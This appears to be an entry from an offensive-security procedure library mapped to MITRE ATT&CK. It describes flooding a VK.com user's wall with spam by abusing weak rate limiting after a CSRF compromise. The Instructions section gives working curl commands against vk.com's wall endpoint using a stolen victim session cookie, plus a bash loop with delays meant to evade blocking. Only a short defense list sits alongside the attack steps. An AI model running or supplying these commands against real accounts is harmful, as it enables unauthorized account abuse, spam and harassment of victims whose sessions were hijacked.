---
tags:
  - flooding
  - spam
  - web
  - rate-limit-bypass
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-wall-flood]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:27:23.548Z'
skill_level: intermediate
impact_level: low
detection_risk: medium
sub_techniques: []
id: 13f33cfe-2c17-484f-9bab-9eed496a51f5
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Flood-Messages-on-VK-User-Wall

## Summary

This procedure exploits insufficient rate limiting in VK.com's wall messaging feature, allowing an attacker to post multiple spam messages to a victim's wall via app-integrated requests, leading to minor flooding and account abuse.

## Description

Following CSRF exploitation, the wall posting endpoint (al_wall.php) can be repeatedly targeted without adequate validation or throttling when using an app ID. The attacker crafts looped POST requests to post short messages, cluttering the victim's wall. This is a secondary impact, useful for spam or harassment. Prerequisites include an established session context from prior CSRF and a valid app ID. Outcomes include 5-10 messages posted before potential detection, highlighting the need for better limits.

## Requirements

1. Valid VK.com application ID
2. Victim's active session
3. Prior access via CSRF or similar
4. Scripting capability for repetition

## Defense

Defensive measures and detection strategies:

- Implement strict rate limiting on wall posts (e.g., 1 per minute per app)
- Require CAPTCHA for repeated actions
- Log and alert on high-volume app-based posts
- Validate message content for spam patterns

## Objectives

1. Post multiple unauthorized messages to victim's wall
2. Demonstrate rate limit weaknesses
3. Amplify abuse from initial CSRF

## Instructions

### Step 1: Prepare Session Context

**Context**: Ensure the request mimics an authenticated app session.

Extract session cookies from a logged-in browser or prior exploit.

### Step 2: Craft Single Post Request

**Context**: Test a single wall post to verify vulnerability.

Use curl to post a message.

**Command** ([[commands/curl-wall-flood]]):

```bash
curl -X POST 'https://vk.com/al_wall.php' \
  -d 'act=post' \
  -d 'al=1' \
  -d 'app_id=123456' \
  -d 'message=Spam Test' \
  -H 'Cookie: remixtid=VICTIM_SESSION;'
```

> Success indicated by post ID in response; message appears on wall.

### Step 3: Loop for Flooding

**Context**: Repeat the request multiple times to flood.

Wrap in a bash loop with delays to avoid immediate blocks.

```bash
for i in {1..5}; do
  curl -X POST 'https://vk.com/al_wall.php' \
    -d 'act=post' \
    -d 'al=1' \
    -d 'app_id=123456' \
    -d 'message=Flood $i' \
    -H 'Cookie: remixtid=VICTIM_SESSION;'
  sleep 2
done
```

> Expected: Multiple messages posted, wall spammed.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Network Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/curl-wall-flood]]

## Tools Used


## Tags

- [[flooding]]
- [[spam]]
- [[web]]
